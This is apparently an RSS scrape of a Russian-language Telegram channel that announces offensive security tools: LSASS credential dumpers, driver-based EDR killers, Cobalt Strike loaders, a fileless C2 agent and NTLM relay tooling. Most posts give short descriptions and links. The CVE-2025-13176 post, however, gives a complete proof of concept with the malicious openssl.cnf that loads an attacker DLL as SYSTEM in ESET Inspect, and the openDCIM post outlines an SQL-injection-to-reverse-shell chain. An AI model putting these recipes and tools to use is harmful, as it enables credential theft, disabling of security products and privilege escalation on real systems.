+A Windows remote desktop persistence tool built on top of Tailscale's WireGuard-encrypted mesh network. TailVNC embeds a fully self-contained VNC server and Tailscale node into a single binary, enabling secure remote desktop access over Tailscale/Headscale without exposing any ports to the public internet. Designed for both legitimate infrastructure administration and red team persistence operations.
+
+[Media: Фото]</description><pubDate>Sat, 11 Apr 2026 17:14:54 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_320</guid></item><item><title>GodPotatoBOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/319</link><description>GodPotatoBOF
+Cobalt Strike BOF used to perform privilege escalation by exploiting the SeImpersonate privilege. OPSEC safe alternative to the .NET version. Based on the original GodPotato.
+
+[Media: Фото]</description><pubDate>Sat, 11 Apr 2026 08:12:30 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_319</guid></item><item><title>Кто top, а кто топ-топ на хуй)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/318</link><description>Кто top, а кто топ-топ на хуй)
+
+[Media: Фото]</description><pubDate>Thu, 09 Apr 2026 15:06:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_318</guid></item><item><title>KslKatz  Combining KslDump and GhostKatz to dump LSASS using no-vulnerability KslD.sys memory read to bypass PPL. Extracts MSV1_0 NT hashes and WDigest cleartext passwords (if enabled) from LSASS...</title><link>https://t.me/P0x3k_1N73LL1G3NC3/317</link><description>KslKatz  Combining KslDump and GhostKatz to dump LSASS using no-vulnerability KslD.sys memory read to bypass PPL. Extracts MSV1_0 NT hashes and WDigest cleartext passwords (if enabled) from LSASS using a Microsoft-signed driver.  Fork: https://github.com/…
+
+[Media: Фото]</description><pubDate>Thu, 09 Apr 2026 11:02:20 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_317</guid></item><item><title>PoisonKiller  Another BYOVD process killer. works on CrowdStrike. fully signed.  Blog: Reverse Engineering a 0day used Against CrowdStrike EDR</title><link>https://t.me/P0x3k_1N73LL1G3NC3/316</link><description>PoisonKiller  Another BYOVD process killer. works on CrowdStrike. fully signed.  Blog: Reverse Engineering a 0day used Against CrowdStrike EDR
+
+[Media: Фото]</description><pubDate>Thu, 09 Apr 2026 10:54:52 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_316</guid></item><item><title>Message 315</title><link>https://t.me/P0x3k_1N73LL1G3NC3/315</link><description>
+
+[Media: Фото]</description><pubDate>Tue, 07 Apr 2026 16:30:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_315</guid></item><item><title>ICMP-Ghost-A-Fileless-x64-Assembly-C2-Agent</title><link>https://t.me/P0x3k_1N73LL1G3NC3/314</link><description>ICMP-Ghost-A-Fileless-x64-Assembly-C2-Agent
+Fileless C2 agent written in pure x64 Assembly for Linux. Features stealth ICMP tunneling, memory-only execution via memfd_create, and terminal-independent daemonization.
+Blog: ICMP-Ghost v3.0: Advanced Stealth &amp; DPI Evasion in Pure x64 Assembly
+
+[Media: Фото]</description><pubDate>Tue, 07 Apr 2026 11:03:24 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_314</guid></item><item><title>PoisonKiller</title><link>https://t.me/P0x3k_1N73LL1G3NC3/313</link><description>PoisonKiller
+Another BYOVD process killer. works on CrowdStrike. fully signed.
+Blog: Reverse Engineering a 0day used Against CrowdStrike EDR
+
+[Media: Фото]</description><pubDate>Mon, 06 Apr 2026 10:58:55 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_313</guid></item><item><title>UnderlayCopy  PowerShell toolkit that extracts locked Windows files (SAM, SYSTEM, NTDS, ...) using MFT parsing and raw disk reads.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/312</link><description>UnderlayCopy  PowerShell toolkit that extracts locked Windows files (SAM, SYSTEM, NTDS, ...) using MFT parsing and raw disk reads.
+
+[Media: Фото]</description><pubDate>Sun, 05 Apr 2026 11:40:17 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_312</guid></item><item><title>KslKatzBOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/311</link><description>KslKatzBOF
+A Beacon Object File (BOF) in-line LSASS credential extraction using the KslD.sys BYOVD technique.
+
+[Media: Фото]</description><pubDate>Sat, 04 Apr 2026 11:13:19 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_311</guid></item><item><title>KillChain</title><link>https://t.me/P0x3k_1N73LL1G3NC3/310</link><description>KillChain
+Kernel Process Termination Tool ( CVE-2026-0828 exploit). KillChain is a user-mode tool that leverages a vulnerable kernel driver (ProcessMonitorDriver.sys, CVE-2026-0828) to terminate protected processes from user space. It communicates with the kernel via a custom IOCTL interface, bypassing standard process protection mechanisms.
+
+[Media: Фото]</description><pubDate>Thu, 02 Apr 2026 16:53:56 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_310</guid></item><item><title>Ligolo-IWA</title><link>https://t.me/P0x3k_1N73LL1G3NC3/309</link><description>Ligolo-IWA
+A Ligolo-ng JavaScript agent working inside Chrome &amp; Chromium-based browsers by leveraging Isolated Web Applications.
+
+[Media: Фото]</description><pubDate>Tue, 31 Mar 2026 07:59:42 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_309</guid></item><item><title>WebRelayX</title><link>https://t.me/P0x3k_1N73LL1G3NC3/308</link><description>WebRelayX
+An NTLM relay tool focused on Web (http/s) targets. It builds on impacket's ntlmrelayx and adds cookie harvesting and auth scan. The goal of this tool is to automate NTLM-Relaying to targets other than ADCS or Exchange, by harvesting session cookies before or after successful authentication.
+
+[Media: Видео]</description><pubDate>Mon, 30 Mar 2026 03:31:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_308</guid></item><item><title>DRSAT</title><link>https://t.me/P0x3k_1N73LL1G3NC3/307</link><description>DRSAT
+Disconnected RSAT - A method of running Group Policy Manager, Certificate Authority and Certificate Templates MMC snap-ins from non-domain joined machies
+The tool works by injecting a C# library into MMC that will hook the various API calls to trick MMC into believing that the logged on user is a domain user. Hooks are also placed on the NtCreateFile API to redirect file paths that would typically be resolved via DFS to a specific domain controller.
+
+[Media: Фото]</description><pubDate>Sun, 29 Mar 2026 12:26:47 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_307</guid></item><item><title>KslKatz</title><link>https://t.me/P0x3k_1N73LL1G3NC3/306</link><description>KslKatz
+Combining KslDump and GhostKatz to dump LSASS using no-vulnerability KslD.sys memory read to bypass PPL. Extracts MSV1_0 NT hashes and WDigest cleartext passwords (if enabled) from LSASS using a Microsoft-signed driver.
+
+[Media: Фото]</description><pubDate>Wed, 25 Mar 2026 11:41:23 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_306</guid></item><item><title>OktaHound</title><link>https://t.me/P0x3k_1N73LL1G3NC3/305</link><description>OktaHound
+A new data collector for the Okta Platform that ingests information about entities and their relationships within an Okta organization and represents them as nodes and edges in BloodHound’s graph database.
+Blog: Discovering Unexpected Okta Attack Paths with BloodHound
+
+[Media: Фото]</description><pubDate>Mon, 23 Mar 2026 16:52:33 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_305</guid></item><item><title>LDAPNomNom</title><link>https://t.me/P0x3k_1N73LL1G3NC3/304</link><description>LDAPNomNom
+Quietly and anonymously bruteforce Active Directory usernames at insane speeds from Domain Controllers by (ab)using LDAP Ping requests (cLDAP). No Windows audit logs generated. High speed ~ up to 50K/sec per server - go way beyond that with multiple servers in parallel!
+P.S. На старом канале уже было, пусть и тут не теряется.
+
+[Media: Фото]</description><pubDate>Sun, 22 Mar 2026 17:52:43 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_304</guid></item><item><title>Lvl канала подсполз, нужно исправлять😉</title><link>https://t.me/P0x3k_1N73LL1G3NC3/303</link><description>Lvl канала подсполз, нужно исправлять😉
+
+[Media: Фото]</description><pubDate>Fri, 20 Mar 2026 15:56:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_303</guid></item><item><title>Fritter</title><link>https://t.me/P0x3k_1N73LL1G3NC3/302</link><description>Fritter
+A heavily modified fork of TheWover and Odzhan's Donut shellcode generator. It generates position-independent shellcode for in-memory execution of VBScript, JScript, EXE, DLL, and .NET assemblies, but with a heavy focus on evasion and signature resistance.
+
+[Media: Фото]</description><pubDate>Thu, 19 Mar 2026 06:20:04 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_302</guid></item><item><title>CVE-2025-71257 and CVE-2025-71260 BMC FootPrints Pre-Authenticated Remote Code Execution Chain</title><link>https://t.me/P0x3k_1N73LL1G3NC3/301</link><description>CVE-2025-71257 and CVE-2025-71260 BMC FootPrints Pre-Authenticated Remote Code Execution Chain
+• Bypass authentication with CVE-2025-71257.
+• If it is successful, it tries to verify the CVE-2025-71260 RCE by writing a ranomized .jsp file to the tomcat servers webroot. This .jsp file just enumerates system information.
+Blog: https://labs.watchtowr.com/thanks-itsms-threat-actors-have-never-been-so-organized-bmc-footprints-pre-auth-remote-code-execution-chains/
+BMC FootPrints is an IT Service Management (ITSM) solution designed to help IT teams manage service requests, incidents, assets, and changes through configurable workflows and an intuitive web interface.
+
+[Media: Фото]</description><pubDate>Thu, 19 Mar 2026 05:47:50 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_301</guid></item><item><title>Message 300</title><link>https://t.me/P0x3k_1N73LL1G3NC3/300</link><description>
+
+[Media: Фото]</description><pubDate>Wed, 18 Mar 2026 14:38:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_300</guid></item><item><title>KslDump</title><link>https://t.me/P0x3k_1N73LL1G3NC3/299</link><description>KslDump
+KslDump extracts credentials from PPL-protected LSASS using only Microsoft-signed components. No exploit is deployed. No driver is loaded. The entire attack chain ships pre-installed with Windows Defender. Microsoft patched the running version (wd\KslD.sys) by nulling out MmCopyMemory, but left the old vulnerable version (drivers\KslD.sys) sitting on disk. The attacker doesn't bring anything — they just point the service back to what Microsoft forgot to clean up.
+
+[Media: Фото]</description><pubDate>Wed, 18 Mar 2026 08:40:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_299</guid></item><item><title>EVENmonitor</title><link>https://t.me/P0x3k_1N73LL1G3NC3/298</link><description>EVENmonitor
+A monitoring tool for the Windows Event log in pure python. You can just attach it via the network and then filter for specific event IDs or keywords.
+
+[Media: Видео]</description><pubDate>Tue, 17 Mar 2026 14:45:10 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_298</guid></item><item><title>VMkatz</title><link>https://t.me/P0x3k_1N73LL1G3NC3/297</link><description>VMkatz
+Without VMkatz, the traditional workflow looks like this: exfiltrate the entire VM disk or memory snapshot, mount it locally, install a full Windows analysis stack, load the snapshot into a debugger or use mimikatz on a booted copy, and manually piece together credentials from each VM - one at a time. Multiply that by a dozen VMs on the cluster and you are looking at days of bandwidth, tooling, and post-processing.
+VMkatz exists because you shouldn't have to exfiltrate what you can read in place. It extracts Windows secrets - NTLM hashes, DPAPI master keys, Kerberos tickets, cached domain credentials, LSA secrets, NTDS.dit - directly from VM memory snapshots and virtual disks, on the NAS, the hypervisor, wherever the VM files are.
+
+[Media: Фото]</description><pubDate>Tue, 17 Mar 2026 07:55:52 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_297</guid></item><item><title>CVE-2026-24291: Windows LPE (RegPwn)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/296</link><description>CVE-2026-24291: Windows LPE (RegPwn)
+Exploit: https://github.com/mdsecactivebreach/RegPwn
+Blog: https://www.mdsec.co.uk/2026/03/rip-regpwn/
+BOF: https://github.com/Flangvik/RegPwnBOF
+Tested versions:
+Windows 11 25h2
+Windows 11 24h2
+Windows 10 21h2
+Windows Servers 2016/2019/2022
+Patched: Mar 10, 2026
+#lpe #pentest #redteam #ad #cve</description><pubDate>Tue, 17 Mar 2026 07:23:10 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_296</guid></item><item><title>LOLEXFIL</title><link>https://t.me/P0x3k_1N73LL1G3NC3/295</link><description>LOLEXFIL
+Living off the land Data Exfiltration methods (189 trusted tools).
+
+[Media: Фото]</description><pubDate>Mon, 16 Mar 2026 14:03:32 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_295</guid></item><item><title>KaplaStrike</title><link>https://t.me/P0x3k_1N73LL1G3NC3/294</link><description>KaplaStrike
+A Cobalt Strike Reflective Loader built with Crystal Palace — module overloading, NtContinue entry transfer, call stack spoofing, sleep masking, and static signature removal.
+Bypassing EDR in a Crystal Clear Way
+This blog takes you from how C2 payloads actually work under the hood all the way to building a fully evasive reflective loader that bypasses one of the best EDR's, covering module overloading with .pdata registration, NtContinue entry transfer, API call stack spoofing with Draugr, sleep masking, and Crystal Palace YARA signature removal. Every technique explained from why it exists, not just how it works.
+
+[Media: Фото]</description><pubDate>Mon, 16 Mar 2026 04:10:06 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_294</guid></item><item><title>#pentest #kerberos</title><link>https://t.me/P0x3k_1N73LL1G3NC3/292</link><description>#pentest #kerberos
+klist2kirbi - извлечение kerberos билетов из вывода команды klist.exe с преобразованием в валидный тикет путем получения сессионного ключа из ETW провайдера
+https://github.com/airbus-cert/kerlab
+Чат в МАХ
+Канал в МАХ
+Telegram ✉️ @freedomfox
+
+[Media: Фото]</description><pubDate>Sat, 14 Mar 2026 08:31:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_292</guid></item><item><title>}{ак тайм ёпта 😂</title><link>https://t.me/P0x3k_1N73LL1G3NC3/291</link><description>}{ак тайм ёпта 😂
+
+[Media: Фото]</description><pubDate>Wed, 11 Mar 2026 10:37:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_291</guid></item><item><title>Trust no one: are one-way trusts really one way?</title><link>https://t.me/P0x3k_1N73LL1G3NC3/290</link><description>Trust no one: are one-way trusts really one way?
+The main consequence is that the compromise of the trusting forest gives an authenticated access on the trusted forest. This breaks the typical expectation that a one-way trust only allows traversing the forest security boundary in one direction. This is especially true in the typical "administration forest" use case of one-way trusts.
+Most of the usual AD attacks - that require a domain account - can be performed on the trusted domain/forest using the TDO account.
+TDO_dump
+New tool to extract the account used for maintaining the trust between domains (can be extracted from the trusting domain and used to authenticate on the trusted domain). Can be helpful in performing lateral movement across security boundaries within Windows environments.
+
+[Media: Фото]</description><pubDate>Tue, 10 Mar 2026 15:38:25 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_290</guid></item><item><title>Breaking Out of Citrix and other Restricted Desktop Environments</title><link>https://t.me/P0x3k_1N73LL1G3NC3/289</link><description>Breaking Out of Citrix and other Restricted Desktop Environments
+A guide on breaking out of Citrix, VDI and other restricted desktop environments. Well known and modern breakout paths for Windows 10 and Windows 11 builds.
+
+[Media: Фото]</description><pubDate>Tue, 10 Mar 2026 06:01:24 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_289</guid></item><item><title>PrivHound</title><link>https://t.me/P0x3k_1N73LL1G3NC3/287</link><description>PrivHound
+A BloodHound OpenGraph collector that models Windows local privilege escalation as interconnected attack paths.
+
+[Media: Фото]</description><pubDate>Sun, 08 Mar 2026 06:30:26 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_287</guid></item><item><title>openDCIM - SQLi to RCE via Config Poisoning</title><link>https://t.me/P0x3k_1N73LL1G3NC3/286</link><description>openDCIM - SQLi to RCE via Config Poisoning
+Remote code execution chain targeting openDCIM's install.php LDAP configuration form.
+• POST to install.php - SQL injection via LDAP form backs up config, overwrites dot with a command payload
+• GET report_network_map.php - triggers exec(), confirms RCE via id output
+• POST to install.php - overwrites dot with reverse shell payload
+• GET report_network_map.php - triggers reverse shell
+• POST to install.php - restores all original config values from backup table
+Blog: https://chocapikk.com/posts/2026/opendcim-sqli-to-rce/
+openDCIM’s install.php is never locked after installation, accepts unsanitized input into SQL queries, and the application passes a database-stored config value directly to exec(). Chain all three and you get RCE as www-data. On Docker deployments the entire chain is unauthenticated.
+
+[Media: Фото]</description><pubDate>Sun, 01 Mar 2026 14:06:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_286</guid></item><item><title>WatchDogKiller</title><link>https://t.me/P0x3k_1N73LL1G3NC3/283</link><description>WatchDogKiller
+PoC exploit for the vulnerable WatchDog Anti-Malware driver (amsdk.sys) – weaponized to kill protected EDR/AV processes via BYOVD
+Blog: Researching an APT Attack and Weaponizing It: The WatchDog BYOVD Story
+
+[Media: Фото]</description><pubDate>Sun, 01 Mar 2026 07:08:08 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_283</guid></item><item><title>PatchReview</title><link>https://t.me/P0x3k_1N73LL1G3NC3/282</link><description>PatchReview
+MS patch checking tool
+
+[Media: Фото]</description><pubDate>Sat, 28 Feb 2026 12:31:35 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_282</guid></item><item><title>ADPulse</title><link>https://t.me/P0x3k_1N73LL1G3NC3/281</link><description>ADPulse
+An open-source Active Directory security auditing tool that connects to a domain controller via LDAP(S), runs 35 automated security checks, and produces detailed reports in console, JSON, and HTML formats.
+
+[Media: Фото]</description><pubDate>Sat, 28 Feb 2026 09:55:28 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_281</guid></item><item><title>GoLinHound</title><link>https://t.me/P0x3k_1N73LL1G3NC3/280</link><description>GoLinHound
+A BloodHound collector written in Go that discovers Linux and SSH attack paths. Outputs OpenGraph JSON and integrates with existing SharpHound and AzureHound data.
+
+[Media: Фото]</description><pubDate>Sat, 28 Feb 2026 09:47:38 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_280</guid></item><item><title>#apt #byovd</title><link>https://t.me/P0x3k_1N73LL1G3NC3/279</link><description>#apt #byovd
+Новый киллер через драйвер eb.sys
+https://github.com/j3h4ck/UnknownKiller
+Чат в МАХ
+Канал в МАХ
+Telegram ✉️ @freedomfox
+
+[Media: Фото]</description><pubDate>Fri, 27 Feb 2026 15:50:05 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_279</guid></item><item><title>=)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/278</link><description>=)
+
+[Media: Фото]</description><pubDate>Mon, 23 Feb 2026 14:29:14 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_278</guid></item><item><title>Gaining Initial Access and Outsmarting SmartScreen</title><link>https://t.me/P0x3k_1N73LL1G3NC3/277</link><description>Gaining Initial Access and Outsmarting SmartScreen
+.zip email attachment that includes a VHDX (Hard Disk Image File) + Mark of the Web and SmartScreen bypass using Trusted Executable Reputation and DLL Sideloading.
+Tools: https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-2-21-Initial%20Access%20and%20Outsmarting%20SmartScreen
+
+[Media: Фото]</description><pubDate>Sun, 22 Feb 2026 15:51:15 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_277</guid></item><item><title>LSA Whisper BOF</title><link>https://t.me/P0x3k_1N73LL1G3NC3/276</link><description>LSA Whisper BOF
+A Cobalt Strike Beacon Object File (BOF) port of LSA Whisperer — the tool that talks directly to Windows authentication packages through the LSA untrusted/trusted client interface, without touching LSASS process memory even when PPL and Credential Guard is enabled.
+
+[Media: Фото]</description><pubDate>Sun, 22 Feb 2026 10:54:55 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_276</guid></item><item><title>…ленов.</title><link>https://t.me/P0x3k_1N73LL1G3NC3/275</link><description>…ленов.
+Простите, я уже из К&amp;Б вернулся.
+
+[Media: Фото]</description><pubDate>Fri, 20 Feb 2026 18:36:18 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_275</guid></item><item><title>🏃 AD CS LOLBAS Toolkit</title><link>https://t.me/P0x3k_1N73LL1G3NC3/274</link><description>🏃 AD CS LOLBAS Toolkit
+Native Windows toolkit for AD CS enumeration and exploitation. Everything runs through built-in OS components (certreq.exe, certutil.exe, PowerShell AD module, .NET Framework) - no third-party tools needed. Build with a sprinkle of FAFO and some finding out in lab env
+Скрипты:
+🐥adcs-common.ps1
+🐥Invoke-Enumerate.ps1
+🐥Invoke-SnapshotAudit.ps1
+🐥Invoke-RemoteAudit.ps1
+🐥Invoke-ESC1.ps1 .. Invoke-ESC13.ps1
+🐥Invoke-FindTemplates.ps1
+🐥Invoke-PassTheCert.ps1
+🐥Invoke-ShadowCredentials.ps1
+🐥Invoke-Kerberoast.ps1
+🐥Invoke-DomainRecon.ps1
+😹 Repo
+#adcs #windows #powershell
+✈️ Whitehat Lab 💬Chat
+
+[Media: Фото]</description><pubDate>Fri, 20 Feb 2026 08:53:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_274</guid></item><item><title>CVE-2025-13176: Local Privilege Escalation in ESET Inspect EDR</title><link>https://t.me/P0x3k_1N73LL1G3NC3/273</link><description>CVE-2025-13176: Local Privilege Escalation in ESET Inspect EDR
+LPE vulnerability in the ESET Inspect Connector for Windows (versions prior to 3.0.5765) due to the ElConnector.exe process (running as SYSTEM) attempting to load an OpenSSL configuration file from a non-existent path that can be created by a low-privileged user
+PoC:
+1) Create the directory: C:\src\vcpkg\packages\openssl_x64-windows-static\
+2) Place a malicious DLL (e.g., woot.dll) in that directory.
+3) Create an openssl.cnf file in that directory with the following content:
+# Malicious openssl.cnf
+openssl_conf = openssl_init
+[openssl_init]
+engines = engine_section
+[engine_section]
+cmd = cmd_section
+[cmd_section]
+engine_id = cmd
+dynamic_path = C:\\src\\vcpkg\\packages\\openssl_x64-windows-static\\woot.dll
+init = 0
+4) Wait for the ESET Inspect Connector service to restart or trigger an OpenSSL initialization.
+5) The woot.dll is loaded inside the EDR’s process and executed as SYSTEM. There is no signing requirement for DLLs in this process.
+
+[Media: Фото]</description><pubDate>Wed, 18 Feb 2026 09:02:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_273</guid></item><item><title>The Mimikatz Missing Manual</title><link>https://t.me/P0x3k_1N73LL1G3NC3/272</link><description>The Mimikatz Missing Manual
+My goal was to create the "Missing Manual" — the documentation that explains not just the commands, but the why and the how of the Windows protocols being manipulated.
+Parts:
+• Foundations: Setting up your environment and the basic syntax.
+• System Internals: How Windows handles tokens, processes, and services.
+• LSASS &amp; Credentials: The heart of Mimikatz—extracting secrets from memory.
+• Kerberos Deep Dive: Tickets, forgery, and delegation.
+• PKI &amp; Certificates: Hardware and software-based identities.
+• Domain Persistence: Owning the directory through replication.
+•DPAPI: Unlocking the secrets at rest.
+
+[Media: Фото]</description><pubDate>Wed, 18 Feb 2026 06:07:11 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_272</guid></item><item><title>Форк популярного скрипта ldapdomaindump, но только работает с ADWS</title><link>https://t.me/P0x3k_1N73LL1G3NC3/271</link><description>Форк популярного скрипта ldapdomaindump, но только работает с ADWS
+https://github.com/mverschu/adwsdomaindump
+#ad #pentest #redteam #recon</description><pubDate>Wed, 18 Feb 2026 05:01:17 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_271</guid></item><item><title>Уроним пару бустов на канал?😏</title><link>https://t.me/P0x3k_1N73LL1G3NC3/270</link><description>Уроним пару бустов на канал?😏
+
+[Media: Фото]</description><pubDate>Mon, 16 Feb 2026 07:02:04 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_270</guid></item><item><title>CVE-2025-61155: Arbitrary Process Termination in GameDriverX64.sys (BYOVD)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/269</link><description>CVE-2025-61155: Arbitrary Process Termination in GameDriverX64.sys (BYOVD)
+The GameDriverX64.sys kernel-mode anti-cheat driver (v7.23.4.7 and earlier) contains an access control vulnerability in one of its IOCTL handlers. A user-mode process can open a handle to the driver device and send specially crafted IOCTL requests. These requests are executed in kernel-mode context, allowing the attacker to terminate arbitrary processes, including critical system and security services (AV / EDR), without requiring administrative privileges.
+Blog: https://vespalec.com/blog/tower-of-flaws/
+
+[Media: Видео]</description><pubDate>Sun, 15 Feb 2026 16:04:41 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_269</guid></item><item><title>360WFP_Exploit</title><link>https://t.me/P0x3k_1N73LL1G3NC3/268</link><description>360WFP_Exploit
+BYOVD: Use 360 Security WFP driver (360netmon_x64_wfp.sys) to block EDR/XDR network connection.
+
+[Media: Фото]</description><pubDate>Sun, 15 Feb 2026 14:05:06 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_268</guid></item><item><title>Lnk-it-up</title><link>https://t.me/P0x3k_1N73LL1G3NC3/267</link><description>Lnk-it-up
+Project for generating and identifying deceptive LNK files.
+Blog post: Trust Me, I'm A Shortcut.
+Windows’ primary mechanism for shortcuts, LNK files, is frequently abused by threat actors for payload delivery and persistence. This blog post introduces several new LNK file flaws that, amongst other things, allow attackers to fully spoof an LNK’s target and hide any command-line arguments provided.
+
+[Media: Видео]</description><pubDate>Sun, 15 Feb 2026 06:49:58 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_267</guid></item><item><title>STProcessMonitorBYOVD</title><link>https://t.me/P0x3k_1N73LL1G3NC3/266</link><description>STProcessMonitorBYOVD
+One more BYOVD. STProcessMonitor driver is not in Windows vulnerable driver blocklist and allows to terminate AV / EDR processes.
+Blog: https://bbs.kafan.cn/thread-2288675-1-1.html
+
+[Media: Фото]</description><pubDate>Sat, 14 Feb 2026 16:25:17 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_266</guid></item><item><title>Rustbof</title><link>https://t.me/P0x3k_1N73LL1G3NC3/265</link><description>Rustbof
+This project enables the development of BOFs using Rust with full no_stdsupport. It leverages Rust's safety features and modern tooling while producing small, efficient COFF objects.
+The framework provides everything needed for BOF development. The build process compiles your code to a static library, which boflink then links into a COFF object with proper relocations and imports for Beacon's dynamic function resolution.
+
+[Media: Фото]</description><pubDate>Fri, 13 Feb 2026 13:23:24 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_265</guid></item><item><title>Eden</title><link>https://t.me/P0x3k_1N73LL1G3NC3/264</link><description>Eden
+UDRL loader for Cobalt Strike built with Crystal Palace that combines Raphael Mudge's page streaming technique with a modular call gate (currently a PIC version of the Sleepmask-VS Draugr callgate BOF).
+Blog: https://www.cobaltstrike.com/blog/playing-in-the-tradecraft-garden-of-beacon
+
+[Media: Видео]</description><pubDate>Thu, 12 Feb 2026 09:47:07 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_264</guid></item><item><title>Message 263</title><link>https://t.me/P0x3k_1N73LL1G3NC3/263</link><description>
+
+[Media: Фото]</description><pubDate>Tue, 10 Feb 2026 15:20:53 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_263</guid></item><item><title>AutoPtT</title><link>https://t.me/P0x3k_1N73LL1G3NC3/262</link><description>AutoPtT
+Enumerates Kerberos tickets and performs Pass-the-Ticket (PtT) attacks interactively or step by step. It is a standalone alternative to Rubeus or Mimikatz.
+• auto - Automated Pass-the-Ticket attack
+• sessions - List logon sessions. Similar to running klist sessions
+• klist - List tickets in the current session. Similar to running klist
+• tickets - List tickets in all sessions (not only TGTs). Similar to running Rubeus.exe dump
+• export - Export a TGT given the LogonId. Similar to running Rubeus.exe dump
+• ptt - Import a ticket file given the file name. Similar to running Rubeus.exe ptt
+Blog: Automating the Pass-The-Ticket attack
+
+[Media: Фото]</description><pubDate>Tue, 10 Feb 2026 11:59:06 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_262</guid></item><item><title>CVE-2025-11730: Post‑authentication Remote Code Execution via DDNS configuration in ZYXEL ATP/USG Series (V5.41)</title><link>https://t.me/P0x3k_1N73LL1G3NC3/261</link><description>CVE-2025-11730: Post‑authentication Remote Code Execution via DDNS configuration in ZYXEL ATP/USG Series (V5.41)
+By configuring a DDNS Profile with a crafted URL, it is possible to obtain a root shell.
+Exploit: https://github.com/rainpwn/exploits/blob/main/zyxel/rainpwn_cve-2025-11730_ddns_rce.py
+
+[Media: Фото]</description><pubDate>Sun, 08 Feb 2026 08:25:35 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_261</guid></item><item><title>LOLRMM</title><link>https://t.me/P0x3k_1N73LL1G3NC3/260</link><description>LOLRMM
+A curated list of Remote Monitoring and Management (RMM) tools.
+
+[Media: Фото]</description><pubDate>Sat, 07 Feb 2026 08:13:01 +0000</pubDate><guid isPermaLink="false">telegram_P0x3k_1N73LL1G3NC3_260</guid></item><item><title>EDR-GhostLocker</title><link>https://t.me/P0x3k_1N73LL1G3NC3/258</link><description>EDR-GhostLocker
+AppLocker-Based EDR Neutralization
+Blog: AppLocker Rules Abuse
